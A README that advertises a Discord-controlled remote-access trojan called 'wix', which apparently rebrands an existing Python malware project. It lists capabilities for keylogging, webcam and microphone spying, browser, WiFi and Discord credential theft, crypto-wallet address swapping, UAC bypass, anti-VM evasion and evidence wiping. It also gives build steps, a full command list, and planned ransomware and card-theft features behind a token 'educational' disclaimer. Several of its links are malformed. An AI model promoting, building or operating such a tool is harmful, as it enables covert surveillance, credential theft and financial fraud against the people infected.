<span align='center'>

# `wix`

<p  /></p>

`Advanced RAT malware written in Python, fully controllable through Discord with dedicated GUI builder to make preparation easier.`

</span>

--------------------

## Discord

Join our discord to keep up with the progress, ask questions, recommend features and talk to like minded people!

[![Discord](https://img.shields.io/discord/1114568569850699847?color=7289da&logo=discord&logoColor=white)](https://discord.gg/DYUzz2Y7ax)

--------------------

# Table of contents
- <a href="">Disclaimer</a>
- <a href=">Features</a>
- <a href="">Preparation</a>
- <a href="">Available commands</a>
- <a href="">Setup</a>
- <a href="">Building executable</a>
- <a href="">Autonomic features</a>
- <a href="">Commands manual</a>

--------------------

# Disclaimer
> Information and code provided on this repository are for educational purposes only. The creator is no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.

--------------------

# Features
### wix can do plenty of things, like:
- handle multiple PCs (not only one, like in most of the cases)
- UAC Bypass (gain *Administrative permissions* on startup)
- log every key pressed on *keyboard*
- take *screenshots* anytime you want
- record *screen* anytime you want
- take images from *webcam*
- *block* the *mouse* and *keyboard*
- steal saved *WiFi* passwords
- record *microphone* input (24/7) and save it in *.wav* files
- stream live *microphone* input on voice channel
- browse *files* on target PC
- upload and download *files* from target PC
- grab *history*, *cookies* and *passwords* saved in web browsers
- grab *discord tokens* and system information
- browse and kill running *processes*
- execute files
- replace copied *crypto currency wallet* addresses to your [configured] ones
- trigger *Blue Screen of Death*
- execute *fork bomb* (crash the PC)
- *Anti-VM* (PySilon wont run on Virtual Machines, f.ex.: VirtualBox, VMWare)
- run *CMD* commands
- ***Debug Mode*** for easier testing and `contribution`

--------------------

# Preparation<br />

`git clone https://github.com/mategol/pysilon-malware`<br />
`cd pysilon-malware`<br />
<a href="https://github.com/n3mels/wix)">``</a><br />
***Windows:*** `Run the PySilon.bat either from Command Line or double clicking on it`<br />
***Linux:*** `Run the PySilon.sh from Command Line`<br />

--------------------

# Available commands
<a href="https://github.com/n3mels/wix">`.ss`</a> - take screenshot at any time<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.screenrec`</a> - record the screen for 15 seconds<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.webcam`</a> - take a picture from connected webcam<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.block-input`</a> - block the mouse and keyboard (`.unblock-input` to unblock it)<br />
<a href="https://github.com/mategol/pysilon-malware#grab-what-to-grab">`.grab <what-to-grab>`</a> - grab for example saved passwords in web browsers<br />
<a href="https://github.com/mategol/pysilon-malware#join">`.join`</a> - join voice-channel and stream live microphone input<br />
<a href="https://github.com/mategol/pysilon-malware#pwd">`.pwd`</a> - show working directory<br />
<a href="https://github.com/mategol/pysilon-malware#tree">`.tree`</a> - show tree of working directory<br />
<a href="https://github.com/mategol/pysilon-malware#cd-directory">`.cd <dir>`</a> - change working directory<br />
<a href="https://github.com/mategol/pysilon-malware#ls">`.ls`</a> - list content of working directory<br />
<a href="https://github.com/mategol/pysilon-malware#upload-type-filename">`.upload <type> [name]`</a> - upload any file or zipped directory (also greater than 8MB ones) onto target PC<br />
<a href="https://github.com/mategol/pysilon-malware#download-file-or-directory">`.download <file-or-dir>`</a> - download any file or zipped directory (also greater than 8MB ones) from target PC<br />
<a href="https://github.com/mategol/pysilon-malware#show-what-to-show">`.show <what-to-show>`</a> - get list of running processes or available commands<br />
<a href="https://github.com/mategol/pysilon-malware#kill-process-id">`.kill <process-id>`</a> - kill any running process<br />
<a href="https://github.com/mategol/pysilon-malware#execute-file">`.execute <file>`</a> - run any file on target PC<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.start-clipper`</a> - start crypto-clipper (swap crypto currency wallet addresses to your ones, `.stop-clipper` to stop it)<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.bsod`</a> - trigger Blue Screen of Death<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.forkbomb`</a> - execute fork bomb<br />
<a href="https://github.com/mategol/pysilon-malware#remove-file-or-dir">`.remove <file-or-dir>`</a> - remove file or directory on target PC<br />
<a href="https://github.com/mategol/pysilon-malware#implode">`.implode`</a> - remove PySilon from target PC and clean the "evidence"<br />
<a href="[https://github.com/mategol/pysilon-malware#clear](https://github.com/n3mels/wix)">`.clear`</a> - clear messages from file-related channel<br />

--------------------

### Donation methods

- XMR: ```45wj2aubQQQfswkuojCQhZgHCs6qwsbskhrwYTDEaVmkPtcXZmrkqKKSV1JuhXLU8qw2kyagZXyBM1a9fPHrVyJkGrBxtiB```
- Paypal: ```bromk100@gmail.com```

--------------------

### ToDo

List of features that should appear in following releases:

- [ ] optional ransomware
- [ ] webhook connection in case of unexpected circumstances (like BOT-Token banned by Discord)
- [ ] overall system info grabber with cool Discord Embeds
- [ ] traditional reverse shell creator
- [ ] grab credit cards information
- [ ] optional crypto mining (for example, when victim is idle)
- [ ] grab sessions from popular applications (Steam/Minecraft/Metamask/Exodus/Roblox)
- [ ] optimize the code to consume less resources/memory
